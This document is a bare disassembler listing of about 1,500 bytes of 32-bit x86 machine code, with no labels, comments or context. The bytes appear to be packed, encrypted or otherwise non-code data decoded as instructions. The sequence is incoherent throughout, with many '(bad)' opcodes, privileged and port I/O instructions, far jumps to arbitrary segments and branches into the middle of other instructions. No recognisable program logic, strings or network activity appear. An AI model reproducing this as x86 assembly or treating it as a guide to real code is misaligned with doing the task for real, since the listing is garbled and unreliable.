  405e64:	sub    esi,DWORD PTR [ebp+0x6740fd65]
  405e6a:	add    bh,BYTE PTR [esi+0x4d]
  405e6d:	mov    dl,0x5c
  405e6f:	pop    eax
  405e70:	in     al,0x8b
  405e72:	rol    BYTE PTR [edx+0x60],1
  405e75:	cwde   
  405e76:	sub    esp,DWORD PTR [eax+0x45aef1e]
  405e7c:	adc    bl,bl
  405e7e:	sbb    ch,BYTE PTR [edi+0x1]
  405e81:	mov    eax,0x2a40a168
  405e86:	psubb  mm4,QWORD PTR [ecx+0x2ca72cb]
  405e8d:	pop    edi
  405e8e:	mov    ebp,0x90305823
  405e93:	xchg   edx,eax
  405e94:	cli    
  405e95:	loop   0x405ec0
  405e97:	mov    dl,0xdd
  405e99:	add    esp,DWORD PTR [edi]
  405e9b:	loop   0x405e26
  405e9d:	jge    0x405e70
  405e9f:	test   al,0x40
  405ea1:	neg    BYTE PTR [edi-0x5c]
  405ea4:	adc    bl,BYTE PTR [eax+eax*4+0x7c]
  405ea8:	add    bh,bh
  405eaa:	cs je  0x405eb5
  405ead:	mov    eax,0x5133736c
  405eb2:	sub    eax,edi
  405eb4:	jne    0x405ee0
  405eb6:	cld    
  405eb7:	inc    eax
  405eb8:	cmp    BYTE PTR [edi],0x4e
  405ebb:	jmp    0x4b29:0x3d0440e0
  405ec2:	fmul   DWORD PTR [ebp+0x41db3a95]
  405ec8:	push   cs
  405ec9:	add    DWORD PTR [ebx+0x19583821],eax
  405ecf:	mov    esi,ebx
  405ed1:	shl    DWORD PTR [ebx-0x2d],0xa
  405ed5:	cld    
  405ed6:	mov    BYTE PTR [ebp+0x243d04a8],0xac
  405edd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ede:	adc    eax,0xf2b05ce8
  405ee3:	hlt    
  405ee4:	push   ds
  405ee5:	mov    ah,0xe4
  405ee7:	rol    BYTE PTR [esi],cl
  405ee9:	iret   
  405eea:	mov    eax,0xbc3e0a05
  405eef:	rol    BYTE PTR [ebx-0x792d1ad],0x1e
  405ef6:	(bad)  
  405ef7:	enter  0x5aa,0x5e
  405efb:	cmp    cl,BYTE PTR [edx+ebx*2]
  405efe:	push   0xffffff96
  405f00:	lea    edx,[edi]
  405f02:	sub    BYTE PTR [eax],cl
  405f04:	imul   ebx,DWORD PTR [eax],0xf04930ba
  405f0a:	or     eax,0x2e01957a
  405f0f:	sbb    BYTE PTR [eax-0x59],al
  405f12:	loop   0x405f1a
  405f14:	sub    BYTE PTR [ebx+ebx*4+0x2a877825],bh
  405f1b:	pop    eax
  405f1c:	dec    eax
  405f1d:	mov    esp,edx
  405f1f:	mov    eax,ds:0x896e57dc
  405f24:	lahf   
  405f25:	aam    0x1f
  405f27:	sbb    BYTE PTR [esi-0x5f],bl
  405f2a:	clc    
  405f2b:	push   esi
  405f2c:	or     esp,ecx
  405f2e:	pop    es
  405f2f:	outs   dx,DWORD PTR ds:[esi]
  405f30:	adc    DWORD PTR [esi+0x44b09412],edi
  405f36:	push   eax
  405f37:	or     BYTE PTR [eax-0x61],cl
  405f3a:	fnstsw WORD PTR [ebx-0x47]
  405f3d:	mov    WORD PTR [eax-0x46b3f7ad],?
  405f43:	adc    edx,DWORD PTR [eax+0x20]
  405f46:	lock mov ch,0x68
  405f49:	div    ah
  405f4b:	and    DWORD PTR [eax+0x307e0845],ebx
  405f51:	ret    
  405f52:	jecxz  0x405f19
  405f54:	xor    al,0xa2
  405f56:	push   eax
  405f57:	xor    eax,0x406a36eb
  405f5c:	add    bl,cl
  405f5e:	jo     0x405f92
  405f60:	pop    eax
  405f61:	pop    esi
  405f62:	aam    0x56
  405f64:	pop    ebx
  405f65:	out    dx,al
  405f66:	sbb    DWORD PTR [ebp+0x68],esi
  405f69:	adc    BYTE PTR [edx],dh
  405f6b:	inc    ebp
  405f6c:	lds    esi,FWORD PTR [edx]
  405f6e:	push   es
  405f6f:	add    eax,0xe04b4b7f
  405f74:	bound  eax,QWORD PTR [eax+ebx*2+0x42]
  405f78:	add    ecx,edx
  405f7a:	stos   DWORD PTR es:[edi],eax
  405f7b:	xchg   edi,eax
  405f7c:	or     eax,0x68dd4d0a
  405f81:	test   al,0xb0
  405f83:	sahf   
  405f84:	cli    
  405f85:	lea    eax,[edi+0x4]
  405f88:	inc    edx
  405f89:	add    ecx,DWORD PTR [ebx]
  405f8b:	push   esi
  405f8c:	stc    
  405f8d:	cld    
  405f8e:	test   bl,bl
  405f90:	jno    0x405f37
  405f92:	add    BYTE PTR [eax-0x69b0d77b],0xbc
  405f99:	rol    BYTE PTR [eax-0x5d31d97f],0x51
  405fa0:	imul   edi,eax,0xa84d3ab2
  405fa6:	(bad)  
  405fa7:	fs lock pusha 
  405faa:	mov    al,0xee
  405fac:	push   cs
  405fad:	les    edi,FWORD PTR [ebp-0x2b]
  405fb0:	mov    ds:0x2a96230a,al
  405fb5:	fsincos 
  405fb7:	pop    esi
  405fb8:	mov    BYTE PTR ds:0x5777b0c1,0x5a
  405fbf:	add    al,0xa9
  405fc1:	adc    BYTE PTR ds:0x847b77fe,0x1a
  405fc8:	nop
  405fc9:	push   edi
  405fca:	pushf  
  405fcb:	mov    ds:0x7044e68d,eax
  405fd0:	xor    dl,bl
  405fd2:	test   eax,0x609195da
  405fd7:	and    al,0xc7
  405fd9:	jp     0x405f7e
  405fdb:	mov    ds:0x3f02f8aa,eax
  405fe0:	les    ecx,FWORD PTR [edx+0x78804f9b]
  405fe6:	or     al,0x33
  405fe8:	hlt    
  405fe9:	sti    
  405fea:	daa    
  405feb:	jecxz  0x40600e
  405fed:	je     0x405fb2
  405fef:	aam    0x8a
  405ff1:	push   cs
  405ff2:	or     DWORD PTR [ebp+eiz*1-0x7c],edx
  405ff6:	les    ebp,FWORD PTR ds:0x636552bd
  405ffc:	or     BYTE PTR [ecx-0x580e1f2b],bh
  406002:	(bad)  
  406003:	xor    ebx,ebx
  406005:	(bad)  
  406006:	stos   BYTE PTR es:[edi],al
  406007:	lock adc eax,0x188bff58
  40600d:	cmp    ebx,0x6
  406010:	jg     0x40601b
  406012:	cmp    esi,DWORD PTR [ebx*8-0xecdadec]
  406019:	mov    dl,0x11
  40601b:	cmp    bl,bh
  40601d:	sbb    edx,DWORD PTR ds:0x18dd0c8b
  406023:	inc    edx
  406024:	push   esp
  406025:	pusha  
  406026:	sahf   
  406027:	push   ecx
  406028:	or     BYTE PTR [ebp+0x1deb3492],bh
  40602e:	sbb    dh,al
  406030:	inc    esp
  406031:	push   esp
  406032:	inc    al
  406034:	outs   dx,BYTE PTR ds:[esi]
  406035:	ss jle 0x406045
  406038:	rcl    BYTE PTR [esi+0x3d],1
  40603b:	xchg   ebx,eax
  40603c:	sub    al,0x89
  40603e:	jo     0x40604c
  406040:	pop    ecx
  406041:	sbb    edx,edi
  406043:	(bad)  
  406044:	xor    ch,BYTE PTR [edi+0xafea454]
  40604a:	push   esp
  40604b:	sti    
  40604c:	xchg   DWORD PTR [ebx+0x530169e0],ebp
  406052:	push   eax
  406053:	sar    dh,1
  406055:	retf   0xc74
  406058:	push   es
  406059:	jbe    0x40606b
  40605b:	js     0x406034
  40605d:	adc    BYTE PTR [edx+ebp*8+0x4e127216],cl
  406064:	adc    eax,0x6d2a078c
  406069:	adc    DWORD PTR [edx],ecx
  40606b:	jmp    0x406098
  40606d:	push   cs
  40606e:	nop
  40606f:	and    esp,DWORD PTR [ebx+0x10]
  406072:	push   es
  406073:	push   ebp
  406074:	sub    dl,0x34
  406077:	or     bl,ch
  406079:	jbe    0x4060eb
  40607b:	lea    ebp,[ebx+ecx*4]
  40607e:	(bad)  
  40607f:	or     esi,DWORD PTR [edx-0x15]
  406082:	pop    es
  406083:	fucomip st,st(4)
  406085:	pop    ss
  406086:	push   0xffffff87
  406088:	data16 adc BYTE PTR [esi+0x5be03dc2],cl
  40608f:	aaa    
  406090:	loopne 0x4060da
  406092:	add    BYTE PTR [ebx+0x2d],0x2a
  406096:	cld    
  406097:	loope  0x4060fe
  406099:	inc    ebx
  40609a:	pop    esi
  40609b:	adc    ebx,DWORD PTR [eax]
  40609d:	pusha  
  40609e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40609f:	out    0xa,al
  4060a1:	add    esp,DWORD PTR [ecx-0x6f]
  4060a4:	daa    
  4060a5:	add    eax,0x8ae34e04
  4060aa:	shl    DWORD PTR [ecx-0x3c41130],cl
  4060b0:	push   es
  4060b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060b2:	adc    eax,0xb5250a0
  4060b7:	mov    ch,ah
  4060b9:	or     al,0xf0
  4060bb:	fmul   QWORD PTR [esi+0x17]
  4060be:	int    0x7d
  4060c0:	hlt    
  4060c1:	clc    
  4060c2:	push   ds
  4060c3:	in     al,0x96
  4060c5:	push   esp
  4060c6:	loopne 0x406069
  4060c8:	cld    
  4060c9:	ror    al,0x87
  4060cc:	xchg   DWORD PTR [ebp-0x20],ecx
  4060cf:	xor    BYTE PTR [edi+eiz*2+0x70],bl
  4060d3:	and    BYTE PTR [edi+eiz*4],bh
  4060d6:	shl    DWORD PTR [ebx+0x17e0a567],cl
  4060dc:	lock aam 0xd5
  4060df:	(bad)
  4060e2:	out    0x89,al
  4060e4:	loopne 0x4060c6
  4060e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e7:	or     ah,0xaa
  4060ea:	ins    DWORD PTR es:[edi],dx
  4060eb:	add    BYTE PTR [ecx-0x3c],bh
  4060ee:	inc    esi
  4060ef:	loop   0x406088
  4060f1:	ja     0x406143
  4060f3:	xchg   esp,eax
  4060f4:	ror    BYTE PTR [ebp+0x4804c1fa],0xc3
  4060fb:	and    edi,DWORD PTR [esi]
  4060fd:	rcl    DWORD PTR [ebp-0x1731c094],0x18
  406104:	clc    
  406105:	push   ds
  406106:	fstp   TBYTE PTR [ebx+ebx*8+0x5f006bd8]
  40610d:	cs daa 
  40610f:	ja     0x40611c
  406111:	pop    ecx
  406112:	push   ebx
  406113:	push   ebp
  406114:	cmp    al,0x48
  406116:	je     0x4060af
  406118:	xchg   ebx,eax
  406119:	pop    ds
  40611a:	in     al,0x48
  40611c:	jmp    0x406173
  40611e:	xor    esi,DWORD PTR [edi+esi*1-0x15]
  406122:	inc    edi
  406123:	xor    eax,0x973ffb28
  406128:	sub    edx,DWORD PTR [esi]
  40612a:	jmp    0x40615b
  40612c:	and    eax,0xb021eb1d
  406131:	add    eax,ebx
  406133:	mov    al,0x4
  406135:	add    al,0x4d
  406137:	shl    DWORD PTR [ecx*2+0x8070605],cl
  40613e:	or     DWORD PTR [ebx],ecx
  406140:	inc    eax
  406141:	dec    ebp
  406142:	shl    DWORD PTR [esp+ecx*1],cl
  406145:	or     eax,0x62f2160e
  40614a:	imul   edi,DWORD PTR [eax],0x27
  40614d:	xor    eax,0x8b51b095
  406152:	pushf  
  406153:	push   cs
  406154:	and    BYTE PTR [edx],0x12
  406157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406158:	mov    WORD PTR [edx+0x69],?
  40615b:	out    dx,al
  40615c:	add    BYTE PTR [ecx+edx*1-0x65574ff6],cl
  406163:	cld    
  406164:	sub    eax,0xf7bace5
  406169:	test   al,0x6c
  40616b:	shl    ecx,1
  40616d:	lahf   
  40616e:	retf   0xfc58
  406171:	cmp    DWORD PTR [ebx+0x14],0xfffffffa
  406175:	(bad)  
  406177:	pop    eax
  406178:	pop    eax
  406179:	rol    BYTE PTR [ebx-0x5a],0x98
  40617d:	inc    ebp
  40617e:	mov    eax,0x2a6c1843
  406183:	mov    DWORD PTR [eax+0x16e488ee],esp
  406189:	or     al,0x50
  40618b:	in     al,dx
  40618c:	sub    al,0xe1
  40618e:	and    ecx,DWORD PTR [ecx-0x7abe1383]
  406194:	mov    dh,0x7e
  406196:	or     BYTE PTR [ebx],dl
  406198:	rcl    DWORD PTR [ebx-0x29],0x8f
  40619c:	loopne 0x40613a
  40619e:	stc    
  40619f:	rcl    BYTE PTR [ecx],cl
  4061a1:	dec    edi
  4061a2:	loopne 0x40613d
  4061a4:	fs pop ds
  4061a6:	xor    al,0x95
  4061a8:	or     dh,BYTE PTR [eax+0x1b8dfefe]
  4061ae:	lea    edx,[ebp-0x7bc1b128]
  4061b4:	xlat   BYTE PTR ds:[ebx]
  4061b5:	pushf  
  4061b6:	add    eax,0x5df32b8b
  4061bb:	lock xor ebp,DWORD PTR [ebx+0x20]
  4061bf:	bound  esi,QWORD PTR [eax]
  4061c1:	mov    eax,DWORD PTR [ecx+0x36c073bc]
  4061c7:	repnz cmc 
  4061c9:	ror    BYTE PTR [ebx],0x25
  4061cc:	les    ebx,FWORD PTR [edi]
  4061ce:	enter  0xb2f8,0x5
  4061d2:	loopne 0x406201
  4061d4:	xchg   edi,eax
  4061d5:	int3   
  4061d6:	ror    ch,1
  4061d8:	out    dx,al
  4061d9:	or     BYTE PTR [esi],bh
  4061db:	int    0xac
  4061dd:	mov    WORD PTR [eax-0x727c0f5f],gs
  4061e3:	pop    ds
  4061e4:	jnp    0x4061d6
  4061e6:	nop
  4061e7:	pop    ds
  4061e8:	js     0x40617e
  4061ea:	gs jmp 0x40624a
  4061ed:	xor    DWORD PTR [eax+0x3e5c877d],edx
  4061f3:	in     eax,0x94
  4061f5:	mov    ebp,0xd2a09c98
  4061fa:	pop    esp
  4061fb:	inc    esi
  4061fc:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4061fe:	nop
  4061ff:	add    cl,BYTE PTR [ecx+ecx*1-0x435b66dd]
  406206:	mov    WORD PTR [ebp-0x70],es
  406209:	out    0x70,eax
  40620b:	add    edx,DWORD PTR [esi]
  40620d:	test   al,0x8c
  40620f:	and    esp,DWORD PTR [ecx]
  406211:	inc    edi
  406212:	pop    edi
  406213:	ret    0x5cbf
  406216:	int3   
  406217:	rcr    DWORD PTR [edx+0xd],1
  40621a:	jae    0x4061f1
  40621c:	mov    edi,0xac5725c7
  406221:	outs   dx,DWORD PTR ds:[esi]
  406222:	ja     0x4061ff
  406224:	cld    
  406225:	or     eax,0x5ff58b6e
  40622a:	rol    BYTE PTR [ebx-0x157c023e],1
  406230:	or     dh,ch
  406232:	sbb    eax,0x730a0e4a
  406237:	and    ah,BYTE PTR [ecx]
  406239:	jo     0x4061eb
  40623b:	stos   BYTE PTR es:[edi],al
  40623c:	and    edx,0x3b
  40623f:	call   0x4896:0xf7809329
  406246:	pop    ecx
  406247:	adc    al,0x30
  406249:	iret   
  40624a:	sbb    al,0xf2
  40624c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40624d:	mov    ecx,0xf000f4d7
  406252:	mov    eax,ds:0xf2f05698
  406257:	or     eax,DWORD PTR [ebx+0x1e]
  40625a:	sahf   
  40625b:	add    al,0x61
  40625d:	pusha  
  40625e:	lods   al,BYTE PTR ds:[esi]
  40625f:	pusha  
  406260:	shl    BYTE PTR [edx],cl
  406262:	cmp    BYTE PTR [esi+eax*1],bl
  406265:	pop    ebx
  406266:	cmp    al,0xd
  406269:	and    DWORD PTR [edi-0x72571de7],eax
  40626f:	imul   edx,DWORD PTR [ecx-0x3edb8b94],0xffffffd3
  406276:	cmp    eax,0x39380677
  40627b:	sar    BYTE PTR [esi-0x5ca00728],cl
  406281:	(bad)  
  406283:	cmp    DWORD PTR [esp+ebp*2-0x7fa86bd4],0x64
  40628b:	nop
  40628c:	mov    eax,ds:0x136556a4
  406291:	loopne 0x4062ad
  406293:	mov    al,0x70
  406295:	rcl    BYTE PTR [eax+ecx*1],0x57
  406299:	ins    DWORD PTR es:[edi],dx
  40629a:	xchg   DWORD PTR [eax-0x33571399],edi
  4062a0:	sub    cl,BYTE PTR [ebx-0x30ff5e02]
  4062a6:	lahf   
  4062a7:	retf   
  4062a8:	sti    
  4062a9:	das    
  4062aa:	xor    al,0xa6
  4062ac:	inc    esp
  4062ad:	or     al,0x20
  4062af:	mov    eax,0xa840a580
  4062b4:	xchg   ebx,eax
  4062b5:	push   edx
  4062b6:	jle    0x406337
  4062b8:	and    BYTE PTR [ecx+0x199cb802],cl
  4062be:	xchg   esp,eax
  4062bf:	push   esi
  4062c0:	inc    eax
  4062c1:	je     0x406272
  4062c3:	out    dx,al
  4062c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062c5:	cmp    eax,0xa11a64e4
  4062ca:	shufps xmm4,xmm0,0x0
  4062ce:	loope  0x4062e9
  4062d0:	jo     0x4062e3
  4062d2:	pop    ebp
  4062d3:	es daa 
  4062d5:	in     eax,dx
  4062d6:	inc    eax
  4062d7:	lods   al,BYTE PTR ds:[esi]
  4062d8:	pop    ds
  4062d9:	inc    esp
  4062da:	nop
  4062db:	nop
  4062dc:	xor    bl,0x34
  4062df:	lock adc DWORD PTR [edi-0x4f88c8bc],eax
  4062e6:	mov    dl,0x30
  4062e8:	push   cs
  4062e9:	xor    edx,DWORD PTR [ecx]
  4062eb:	or     al,0x1b
  4062ed:	fs fmul st,st(4)
  4062f0:	and    eax,DWORD PTR [eax]
  4062f2:	or     al,0x11
  4062f4:	test   al,0xc9
  4062f6:	lods   al,BYTE PTR ds:[esi]
  4062f7:	jb     0x406291
  4062f9:	daa    
  4062fa:	pusha  
  4062fb:	ins    BYTE PTR es:[edi],dx
  4062fc:	inc    esp
  4062fe:	test   eax,0x94ca7440
  406303:	pop    ss
  406304:	dec    edx
  406305:	mov    al,0xb7
  406307:	jbe    0x40631d
  406309:	pusha  
  40630a:	loop   0x4062d5
  40630c:	mov    ds:0xe0ce48bc,eax
  406311:	and    edi,DWORD PTR [edi]
  406313:	adc    BYTE PTR [ebx+eiz*4],al
  406316:	ror    BYTE PTR [eax],0xa3
  406319:	les    edx,FWORD PTR [eax+0x1d]
  40631c:	das    
  40631d:	mov    bh,0xa9
  40631f:	cmp    dl,ch
  406321:	add    DWORD PTR [ebp+0x10],esi
  406324:	push   cs
  406325:	bnd jmp DWORD PTR [ebx-0x45adf38]
  40632c:	popf   
  40632d:	dec    edx
  40632e:	dec    edx
  40632f:	push   ds
  406330:	adc    eax,0x3808ccb8
  406335:	fld    TBYTE PTR [ebp+ebx*8+0x50]
  406339:	adc    al,0xb9
  40633b:	add    BYTE PTR [edi-0x303b4034],0x6
  406342:	sbb    bl,dh
  406344:	xor    dh,0xc4
  406347:	data16 cmp BYTE PTR [esi+ecx*2],0xa0
  40634c:	inc    ecx
  40634d:	sub    dl,ah
  40634f:	pusha  
  406350:	into   
  406351:	adc    al,0x91
  406353:	or     al,0xfd
  406355:	sbb    esp,DWORD PTR [esi]
  406357:	dec    esp
  406358:	hlt    
  406359:	jmp    0x4063a3
  40635b:	mov    esi,edi
  40635d:	dec    esi
  40635e:	jmp    0x406361
  406360:	dec    esi
  406361:	add    DWORD PTR [ebx],ebp
  406363:	mov    bl,0x5f
  406365:	fcom   DWORD PTR [edx]
  406367:	mov    cl,BYTE PTR [eax+esi*1]
  40636a:	and    ecx,0xe9720d3f
  406370:	jg     0x406375
  406372:	mov    al,0x42
  406374:	in     al,0xce
  406376:	and    al,0xd8
  406378:	jns    0x40637f
  40637a:	dec    ecx
  40637b:	imul   BYTE PTR [edi]
  40637d:	add    al,0xf0
  40637f:	or     ecx,0xfffffffe
  406382:	inc    ecx
  406383:	es add al,0xb2
  406386:	add    ch,bl
  406388:	adc    ecx,DWORD PTR [edx+0x2e933804]
  40638e:	and    DWORD PTR [esi+ecx*1+0x2],ebp
  406392:	mov    eax,edx
  406394:	das    
  406395:	or     DWORD PTR [eax+0x3b450005],eax
  40639b:	and    esp,DWORD PTR [ebx]
  40639d:	xchg   esp,eax
  40639e:	les    esi,FWORD PTR [edi+ecx*1+0x5]
  4063a2:	enter  0x86f5,0x7d
  4063a6:	aam    0x9a
  4063a8:	ins    BYTE PTR es:[edi],dx
  4063a9:	out    dx,al
  4063aa:	xor    ecx,ecx
  4063ac:	cmp    eax,DWORD PTR [edi]
  4063ae:	daa    
  4063af:	jge    0x406356
  4063b1:	sar    BYTE PTR [edx+0x5977c14a],cl
  4063b7:	lock jle 0x4063c3
  4063ba:	add    DWORD PTR [edi-0x6bea4bdf],edi
  4063c0:	adc    eax,0x2d42489b
  4063c5:	adc    al,0x6a
  4063c7:	das    
  4063c8:	cmp    eax,0x5c216ed
  4063cd:	xor    al,0xac
  4063cf:	inc    esi
  4063d0:	jge    0x406438
  4063d2:	mov    eax,ds:0xefbe8d61
  4063d7:	mov    cl,0x30
  4063d9:	pop    ecx
  4063da:	inc    eax
  4063db:	cmp    bl,BYTE PTR [ecx]
  4063dd:	sbb    dh,ah
  4063df:	cmp    edi,ebx
  4063e1:	jl     0x406408
  4063e3:	aaa    
  4063e4:	or     eax,0xf6858168
  4063e9:	inc    ebx
  4063ea:	into   
  4063eb:	inc    ebx
  4063ec:	inc    ebp
  4063ed:	dec    eax
  4063ee:	jge    0x40646c
  4063f0:	popf   
  4063f1:	shl    BYTE PTR [ecx-0x16c840fc],0x94
  4063f8:	adc    DWORD PTR [eax],ecx
  4063fa:	cmp    DWORD PTR [eax+0x25],0xf91927ed
  406401:	imul   esp,DWORD PTR [ecx],0x171fa846
  406407:	or     BYTE PTR [edi+0x32],0xc7
  40640b:	cmp    ebx,DWORD PTR [ebp-0xc]
  40640e:	jge    0x40640e
  406410:	in     al,0x68
  406412:	fucom  st(6)
  406414:	jl     0x4063eb
  406416:	jne    0x40643b
  406418:	sbb    eax,0xa10c671e
  40641d:	pusha  
  40641e:	add    BYTE PTR [ebx],bh
  406420:	dec    eax
  406421:	push   0xb0bcc401
  406426:	dec    esi
  406427:	loopne 0x4063b2
  406429:	sbb    BYTE PTR [edi],ch
  40642b:	(bad)  
  40642c:	xor    DWORD PTR [eax+0x4d],esi
  40642f:	add    al,0x8b
  406431:	dec    edx
  406432:	stos   DWORD PTR es:[edi],eax
  406433:	and    eax,ebx
  406435:	dec    eax
  406436:	sbb    al,0x3f
  406438:	pusha  
  406439:	jle    0x406472
  40643b:	in     eax,0xbe
  40643d:	or     DWORD PTR [edx],esi
  40643f:	(bad)  
  406440:	cs push esp
  406442:	imul   esp,DWORD PTR gs:[ebx+ecx*2+0x2d623a3b],0xffffff92
  40644b:	and    bh,BYTE PTR [edi+0xc]
  40644e:	ins    DWORD PTR es:[edi],dx
  40644f:	jg     0x4064b2
  406451:	loope  0x4063f0
  406453:	or     ah,BYTE PTR [edi]
  406455:	or     bh,bh
  406457:	or     BYTE PTR [ebx],al
  406459:	enter  0xbcd1,0x70
  40645d:	mov    ebx,0xb046c79b
  406462:	push   ebp
  406463:	shl    BYTE PTR [edx+0x6],cl
  406466:	and    ecx,edi
  406468:	mov    bh,0xd3
  40646a:	mov    dh,0xc9
  40646c:	es int 0xbf
  40646f:	jge    0x406480
  406471:	pop    ss
  406472:	mov    DWORD PTR [edi+0x68],esp
  406475:	pop    edx
  406476:	push   0xf90a79bf
  40647b:	sub    cl,BYTE PTR [ebx]
  40647d:	pop    edi
  40647e:	jbe    0x406428
  406480:	sub    eax,ebx
  406482:	sub    al,BYTE PTR [ecx-0x69]
  406485:	imul   esi,DWORD PTR [ebx+0x2fd8ec84],0xdec3fcdb
  40648f:	inc    edx
  406490:	iret   
  406491:	inc    edi
  406492:	ja     0x4064b6
  406494:	mov    dl,BYTE PTR [ebx+esi*1-0x1]
  406498:	and    edx,0x332c70f0
  40649e:	adc    DWORD PTR ds:0x48c603bb,0xb5809583
  4064a8:	(bad)  
  4064a9:	out    0x99,eax
  4064ab:	int    0x30
  4064ad:	mov    eax,ds:0x24735200
  4064b2:	push   ds
  4064b3:	mov    ecx,DWORD PTR [esp+edi*2-0x3974eedf]
  4064ba:	ret    
  4064bb:	push   cs
  4064bc:	jl     0x4064be
  4064be:	cmp    eax,0xf9b77736
  4064c3:	outs   dx,DWORD PTR ds:[esi]
  4064c4:	push   eax
  4064c5:	inc    ebx
  4064c6:	xchg   ebx,eax
  4064c7:	jl     0x406483
  4064c9:	sub    eax,0x272d5322
  4064ce:	push   eax
  4064cf:	lods   eax,DWORD PTR ds:[esi]
  4064d0:	loopne 0x4064e7
  4064d2:	outs   dx,DWORD PTR ds:[esi]
  4064d3:	mov    al,0x3e
  4064d5:	inc    edi
  4064d6:	shr    DWORD PTR [ecx+0xf95ffa1],1
  4064dc:	xchg   ebp,eax
  4064dd:	xor    al,0xc3
  4064df:	mov    DWORD PTR [ebp+edi*4-0x25183f61],esi
  4064e6:	test   dh,dh
  4064e8:	dec    ebp
  4064e9:	dec    edi
  4064ea:	shl    BYTE PTR [ebx+0x27],0x47
  4064ee:	popf   
  4064ef:	lds    eax,FWORD PTR [edi-0x227f7c81]
  4064f5:	push   es
  4064f6:	mov    esi,DWORD PTR [esp]
  4064f9:	sub    esi,edi
  4064fb:	loopne 0x406555
  4064fd:	pop    edx
  4064fe:	pop    es
  4064ff:	mov    BYTE PTR [edx-0x1],bl
  406502:	clc    
  406503:	or     bl,BYTE PTR [eax+0x1be850e2]
  406509:	in     eax,dx
  40650a:	xchg   ecx,eax
  40650b:	cmp    BYTE PTR [ebp+0x34],0x7
  40650f:	loopne 0x40651b
  406511:	aam    0x91
  406513:	mov    ebx,0xe81a8922
  406518:	into   
  406519:	stos   DWORD PTR es:[edi],eax
  40651a:	aas    
  40651b:	and    BYTE PTR [eax+0x653d4ac6],al
  406521:	rcr    BYTE PTR [eax-0x80],1
  406524:	sbb    esp,DWORD PTR [eax-0x29]
  406527:	pop    edi
  406528:	stos   DWORD PTR es:[edi],eax
  406529:	mov    al,0xf8
  40652b:	sub    esp,DWORD PTR [esp+edi*2+0x17]
  40652f:	js     0x406545
  406531:	(bad)  
  406532:	aad    0x21
  406534:	fwait
  406535:	and    eax,0x88bf6af
  40653a:	push   ss
  40653b:	sti    
  40653c:	add    dh,BYTE PTR [ecx+ebx*1-0x34]
  406540:	push   esi
  406541:	pop    DWORD PTR [esi+0x46]
  406544:	cmp    edi,DWORD PTR [eax]
  406546:	push   ebx
  406547:	clc    
  406548:	xor    BYTE PTR [edx],dh
  40654a:	dec    edi
  40654b:	or     ch,0xee
  40654e:	push   ds
  40654f:	inc    edx
  406550:	add    al,0x88
  406552:	or     BYTE PTR [ebx-0x7a4841a5],cl
  406558:	outs   dx,DWORD PTR ds:[esi]
  406559:	mov    ebx,cr5
  40655c:	lds    ebx,FWORD PTR [edi+0x76f23bd0]
  406562:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406563:	mov    cl,BYTE PTR [esi]
  406565:	cs push cs
  406567:	inc    ebp
  406568:	int    0x7b
  40656a:	pop    edi
  40656b:	or     edi,eax
  40656d:	add    al,0x5c
  40656f:	sub    eax,0x619a061a
  406574:	jo     0x4065ac
  406576:	push   ds
  406577:	lahf   
  406578:	sub    al,0x3d
  40657a:	mov    esi,0xcf650a1d
  40657f:	add    dl,dl
  406581:	sbb    BYTE PTR ds:0x1a3c07cc,bl
  406587:	imul   eax,DWORD PTR [ebx-0xa],0x19ea0ae8
  40658e:	fisub  DWORD PTR [eax-0x6a]
  406591:	bswap  ecx
  406593:	aas    
  406594:	add    al,0x18
  406596:	push   ss
  406597:	imul   eax,esp,0xffffffe1
  40659a:	daa    
  40659b:	dec    edx
  40659c:	and    BYTE PTR [edi],ah
  40659e:	hlt    
  40659f:	mov    edx,DWORD PTR [edi]
  4065a1:	sub    edx,esi
  4065a3:	xor    eax,edi
  4065a5:	leave  
  4065a6:	mov    bl,0x42
  4065a8:	loopne 0x4065c2
  4065aa:	je     0x4065ae
  4065ac:	nop
  4065ad:	pop    es
  4065ae:	add    cl,BYTE PTR [edi+eax*1+0x20]
  4065b2:	adc    eax,0xd9753b42
  4065b7:	sbb    bl,BYTE PTR [edx-0x29]
  4065ba:	mov    ecx,0x1e0873e4
  4065bf:	hlt    
  4065c0:	fsubr  QWORD PTR [edi+0x99c01f9]
  4065c6:	cmovp  edi,DWORD PTR [eax+0x30]
  4065ca:	and    cl,BYTE PTR [edi+0x1f0aeff5]
  4065d0:	hlt    
  4065d1:	xor    DWORD PTR [eax],edi
  4065d3:	mov    edx,eax
  4065d5:	pop    eax
  4065d6:	sub    eax,0x873c95d8
  4065db:	or     DWORD PTR [ecx],eax
  4065dd:	jecxz  0x40658e
  4065df:	hlt    
  4065e0:	dec    ebp
  4065e1:	loopne 0x40656b
  4065e3:	mov    al,ds:0xf7c77d9f
  4065e8:	pop    es
  4065e9:	pop    esi
  4065ea:	sub    ah,ch
  4065ec:	push   edi
  4065ed:	mov    eax,ds:0x749f8938
  4065f2:	fwait
  4065f3:	inc    eax
  4065f4:	sub    ch,bh
  4065f6:	call   FWORD PTR [edi]
  4065f8:	add    al,0x36
  4065fa:	aaa    
  4065fb:	push   es
  4065fc:	mov    bl,BYTE PTR [edi+esi*1+0x7]
  406600:	sub    bl,al
  406602:	jb     0x40661e
  406604:	inc    ebx
  406605:	mov    BYTE PTR [ebp-0x1],al
  406608:	mov    al,BYTE PTR [ebp+0x2]
  40660b:	fisubr WORD PTR [esi]
  40660d:	ja     0x406640
  40660f:	stos   DWORD PTR es:[edi],eax
  406610:	(bad)  
  406611:	sbb    al,0xfe
  406613:	retf   
  406614:	jne    0x406600
  406616:	shl    BYTE PTR [esi-0x9],cl
  406619:	add    eax,0xcfe838c
  40661e:	jge    0x40662a
  406620:	pop    ebx
  406621:	or     al,BYTE PTR [ebp+esi*2-0x38]
  406625:	mov    edi,0xdb5f53fe
  40662a:	xchg   edi,eax
  40662b:	clc    
  40662c:	pop    ds
  40662d:	ja     0x406636
  40662f:	nop
  406630:	cld    
  406631:	push   edx
  406632:	push   eax
  406633:	mov    BYTE PTR [esi],0x36
  406636:	setb   bh
  406639:	fisub  DWORD PTR [edx+0x6417d95b]
